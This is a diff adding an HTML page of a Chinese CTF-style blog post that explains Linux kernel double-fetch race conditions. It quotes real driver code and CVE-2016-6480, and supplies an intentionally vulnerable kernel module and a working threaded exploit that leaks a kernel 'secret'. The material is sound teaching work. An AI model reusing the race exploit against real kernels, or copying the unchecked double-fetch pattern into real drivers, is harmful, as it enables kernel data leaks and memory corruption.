@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.9.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>Linux Kernel Pwn Ⅳ：Double Fetch - Mask&#39;s blogs</title>
+
+
+    <meta name="description" content="简单介绍内核中条件竞争引起的Double Fetch漏洞">
+<meta name="keywords" content="pwn,kernel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Kernel Pwn Ⅳ：Double Fetch">
+<meta property="og:url" content="Mask6asok.github.io/2020/02/06/Linux-Kernel-Pwn-4.html">
+<meta property="og:site_name" content="Mask&#39;s blogs">
+<meta property="og:description" content="简单介绍内核中条件竞争引起的Double Fetch漏洞">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="/images/og_image.png">
+<meta property="og:updated_time" content="2020-02-06T14:35:41.124Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Kernel Pwn Ⅳ：Double Fetch">
+<meta name="twitter:description" content="简单介绍内核中条件竞争引起的Double Fetch漏洞">
+<meta name="twitter:image" content="/images/og_image.png">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.ico" alt="Linux Kernel Pwn Ⅳ：Double Fetch" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-02-06T14:18:49.014Z">2020-02-06</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    13 分钟 读完 (大约 1988 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Linux Kernel Pwn Ⅳ：Double Fetch
+            
+        </h1>
+        <div class="content">
+            <p>简单介绍内核中条件竞争引起的Double Fetch漏洞</p>
+<a id="more"></a>
+<p><code>Double Fetch</code>是<code>Race Condition</code>的一种，通常是用户态与内核态之间的数据访问竞争，这是在symmetric multiprocessing （SMP）系统才会出现的漏洞，多核机制使得不同的进程可以同时执行相同的代码，导致了条件竞争</p>
+<p>我们知道三个事实</p>
+<ol>
+<li>每个用户进程有其自己的虚拟内存空间</li>
+<li>每个用户进程的虚拟内存空间是孤立的</li>
+<li>内核可以访问所有用户进程的内存空间</li>
+</ol>
+<p><img src="https://i.loli.net/2020/01/31/9IvEm6trwes5yuX.png" alt=""></p>
+<p>一个进程在内核对数据进行验证后，另一个进程对数据进行了修改，从而使内核使用非法数据</p>
+<p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch.png" alt=""></p>
+<p>数据在用户态与内核态之前传递，通常只需要传递一次，如果数据是个结构体变量，或者说数据含有可变类型或者长度，则往往需要第二次传递，或者多次传递。这类数据经常由header与body两部分构成，在获取body这一次数据传递时，很容易发生<code>Double Fetch</code>漏洞，有以下三种主要情况</p>
+<ol>
+<li>Type Selection</li>
+</ol>
+<p>第一次传递根据header决定数据类型，根据不同类型来接受第二次传递，在这之间修改了数据，则造成数据与类型不匹配，如<code>cxgb3 main.c</code>中的一段代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cxgb_extension_ioctl</span><span class="params">(struct net_device *dev,<span class="keyword">void</span> __user *useraddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u32 cmd;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;cmd, useraddr, <span class="keyword">sizeof</span>(cmd)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> CHELSIO_SET_QSET_PARAMS:&#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ch_qset_params</span> <span class="title">t</span>;</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;t, useraddr, <span class="keyword">sizeof</span>(t)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (t.qset_idx &gt;= SGE_QSETS)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> CHELSIO_SET_QSET_NUM:&#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ch_reg</span> <span class="title">edata</span>;</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;edata, useraddr, <span class="keyword">sizeof</span>(edata)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (edata.val &lt; <span class="number">1</span> ||(edata.val &gt; <span class="number">1</span> &amp;&amp; !(...)))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> CHELSIO_SETMTUTAB:&#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ch_mtus</span> <span class="title">m</span>;</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;m, useraddr, <span class="keyword">sizeof</span>(m)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (m.nmtus != NMTUS)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (m.mtus[<span class="number">0</span>] &lt; <span class="number">81</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 <code>line 4</code>时获取了一次数据，并且根据数据类型，选择不同的结构体去接受数据，假如获取到的是<code>CHELSIO_SET_QSET_PARAMS</code>，那么进入<code>line 8</code>的语句，在<code>line 9</code>获取数据前，数据被修改成了<code>CHELSIO_SET_QSET_NUM</code>，那么就是以<code>ch_reg</code>为结构的变量赋给了<code>ch_qset_params</code>结构体，造成了数据类型异常</p>
+<ol>
+<li>Size Checking</li>
+</ol>
+<p>第一次传递根据header获取<code>size</code>，申请对应大小的<code>buf</code>，第二次传递接受数据存入<code>buf</code></p>
+<p>如果一直使用第一次传递的<code>size</code>，那么溢出是可以避免的，若是其他语句中从第二次传递的数据来获取<code>size</code>，那么难免会发生溢出，看<code>CVE-2016-6480</code>中的漏洞代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ioctl_send_fib</span><span class="params">(struct aac_dev* dev,<span class="keyword">void</span> __user *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hw_fib</span> * <span class="title">kfib</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user((<span class="keyword">void</span> *)kfib, arg, <span class="keyword">sizeof</span>(...))) &#123;</span><br><span class="line">		aac_fib_free(fibptr);</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">	size = le16_to_cpu(kfib-&gt;header.Size) + <span class="keyword">sizeof</span>(...);</span><br><span class="line">	<span class="keyword">if</span> (size &lt; le16_to_cpu(kfib-&gt;header.SenderSize))</span><br><span class="line">		size = le16_to_cpu(kfib-&gt;header.SenderSize);</span><br><span class="line">	<span class="keyword">if</span> (size &gt; dev-&gt;max_fib_size) &#123;</span><br><span class="line">		kfib = pci_alloc_consistent(dev-&gt;pdev, size, &amp;daddr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(kfib, arg, size)) &#123;</span><br><span class="line">	retval = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (kfib-&gt;header.Command == cpu_to_le16(...)) &#123;</span><br><span class="line">        ...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		retval = aac_fib_send(le16_to_cpu(kfib-&gt;header.Command),...</span><br><span class="line">					le16_to_cpu(kfib-&gt;header.Size) , FsaNormal,</span><br><span class="line">					<span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        ...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>line 5</code>这里先读取了一次数据，用来确定<code>size</code>（<code>line 10</code>-&gt;<code>line 12</code>），然后在<code>line 14</code>申请了<code>buf</code>，最后在<code>line 16</code>根据<code>size</code>读取了数据，如果在此之前修改了<code>arg</code>指向的内容，也就是用户数据，则读到<code>kfib</code>的数据，可以是异常数据，进一步，在<code>line 24</code>中引用到了<code>klib-&gt;header.Size</code>，这原本是第一次读取时验证的<code>size</code>，如果第二次读取时被恶意线程修改成很大的数，就会造成缓冲区溢出</p>
+<ol>
+<li>Shallow Copy</li>
+</ol>
+<p>这种数据传递通常是结构体类型的变量传递，结构体中包含了指针，当把这个数据传递进内核时，只是得到了结构体的数据，也就是浅拷贝，如果对结构体中的指针验证过后使用之前，恶意线程修改了这个指针，便是绕过了验证</p>
+<h1 id="Vul-LKM"><a href="#Vul-LKM" class="headerlink" title="Vul LKM"></a>Vul LKM</h1><p>以一个简单的例子来分析，模块 double_fetch.c内容如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span>;</span></span><br><span class="line"><span class="keyword">char</span> secret[] = <span class="string">"Double Fetch is great!"</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">t</span>&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> flag;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_fetch_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, struct t *arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x1001</span>:</span><br><span class="line">        printk(<span class="string">"Secret at %p.\n"</span>, secret);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x1002</span>:</span><br><span class="line">        <span class="keyword">if</span>(arg-&gt;flag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arg-&gt;buf == &amp;secret)&#123;</span><br><span class="line">                printk(<span class="string">"You can not see secret.\n"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">            printk(<span class="string">"Checking...\n"</span>);</span><br><span class="line">            msleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">int</span> len = <span class="built_in">strlen</span>(arg-&gt;buf);</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arg-&gt;buf[i] != secret[i])&#123;</span><br><span class="line">                    printk(<span class="string">"Your message is wrong.\n"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            printk(<span class="string">"The secret is : \"%s\".\n"</span>, arg-&gt;buf);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            printk(<span class="string">"You don't want to get it.\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        printk(<span class="string">"ERROR\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">double_fetch_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"You write something.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_fetch_read</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"You read something.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">double_fetch_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    fops.read = double_fetch_read;</span><br><span class="line">    fops.write = double_fetch_write;</span><br><span class="line">    fops.unlocked_ioctl = double_fetch_ioctl;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"double_fetch driver init!\n"</span>);</span><br><span class="line">    create_proc_entry(<span class="string">"double_fetch"</span>, <span class="number">0666</span>, <span class="number">0</span>)-&gt;proc_fops = &amp;fops;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">double_fetch_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"double_fetch driver exit\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(double_fetch_init);</span><br><span class="line">module_exit(double_fetch_exit);</span><br></pre></td></tr></table></figure>
+<p>在该模块中注册的<code>ioctl</code>函数提供两个功能</p>
+<ul>
+<li><code>0x1001</code>会输出模块中<code>secret</code>的地址</li>
+<li><code>0x1002</code>会对参数进行验证，这里的参数是一个结构体指针，拥有两个成员，一个<code>flag</code>标志位与一个<code>buf</code>指针，当标志位为真且buf指针不能是内核中的<code>secret</code>地址，如果<code>buf</code>与<code>secret</code>内容相同，则输出</li>
+</ul>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>那么如何获取这个<code>secret</code>内容，可以使用<code>Shallow Copy</code>的问题，在<code>0x1002</code>中，对buf指针验证与内容验证中间，我写了一个<code>msleep(50)</code>来程序堵塞情况，在这<code>50ms</code>的时间间隔里，如果修改<code>buf</code>指针变成<code>secret</code>的地址，则可以成功输出<code>secret</code>的内容</p>
+<p>如何在这<code>50ms</code>内，对<code>buf</code>指针进行修改，这就是<code>Double Fetch</code>的重点所在</p>
+<p>我们知道如今的多任务处理系统，看起来多个程序在同时运行，其实是CPU与操作系统一起营造的假象，事实是由操作系统来调度，当CPU处理程序A时，因为某种原因需要等待，那么CPU转而去处理程序B，回头再来处理A，当 CPU速度足够快时，看起来就是程序A，B同时运行</p>
+<p>所以我们需要另一个线程来修改<code>buf</code>指针，主线程不断地调用<code>0x1002</code>的功能，另一个线程则不断的修改<code>buf</code>指针，当主线程中完成了对<code>buf</code>的检查后，在那<code>50ms</code>的间隔里，另一个线程修改了<code>buf</code>指针指向了<code>secret</code>，则下面的逐字符比较其实就是自身比较，则可以输出<code>secret</code>内容了</p>
+<p><img src="https://i.loli.net/2020/01/31/WZiUVcTjOK2BIw9.png" alt=""></p>
+<p>pwn.c内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc pwn.c -static -lpthread -o pwn </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> secret_at 0xffffffffa00002b0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">t</span>&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> flag;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ok = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(struct t* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">while</span>(ok)&#123;</span><br><span class="line">        p-&gt;buf = secret_at;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> junk[] = <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/double_fetch"</span>, O_WRONLY);</span><br><span class="line">    ioctl(fd, <span class="number">0x1001</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">t</span> <span class="title">fake</span>;</span></span><br><span class="line">    fake.flag = <span class="number">1</span>;</span><br><span class="line">    fake.buf = &amp;junk;</span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, change, &amp;fake);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        fake.buf = &amp;junk;</span><br><span class="line">        ioctl(fd, <span class="number">0x1002</span>, &amp;fake);</span><br><span class="line">    &#125;</span><br><span class="line">    ok = <span class="number">0</span>;</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于这里需要多线程的支持，qemu启动也得开启多线程的功能</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-smp <span class="number">2</span>,cores=<span class="number">2</span>,threads=<span class="number">1</span>  \</span><br></pre></td></tr></table></figure>
+<p>同时也要关闭<code>SMAP</code>，因为在内核中引用了用户态数据</p>
+<h1 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h1><p>Double_Fetch：链接: <a href="https://pan.baidu.com/s/1g-a34lnS4ShDzjyAagkIyQ">https://pan.baidu.com/s/1g-a34lnS4ShDzjyAagkIyQ</a> 提取码: ike9 </p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.inforsec.org/wp/?p=2049">针对Linux内核中double fetch漏洞的研究</a></p>
+<p><a href="https://github.com/UCL-CREST/doublefetch">https://github.com/UCL-CREST/doublefetch</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/">Double Fetch - CTF Wiki</a></p>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/kernel/">kernel</a>, <a class="has-link-grey -link" href="/tags/pwn/">pwn</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/02/06/Linux-Kernel-Pwn-3.html">
+                <span class="level-item">Linux Kernel Pwn Ⅲ：Stack Overflow</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left is-sticky">
+    
+        
+
+    <div class="card widget" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#Vul-LKM">
+        <span class="has-mr-6">1</span>
+        <span>Vul LKM</span>
+        </a></li><li>
+        <a class="is-flex" href="#Exploit">
+        <span class="has-mr-6">2</span>
+        <span>Exploit</span>
+        </a></li><li>
+        <a class="is-flex" href="#Attachment">
+        <span class="has-mr-6">3</span>
+        <span>Attachment</span>
+        </a></li><li>
+        <a class="is-flex" href="#Reference">
+        <span class="has-mr-6">4</span>
+        <span>Reference</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="" src="/images/avatar.png" alt="Mask">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        Mask
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        A newbie in CTF
+                    </p>
+                    
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <a href="/archives">
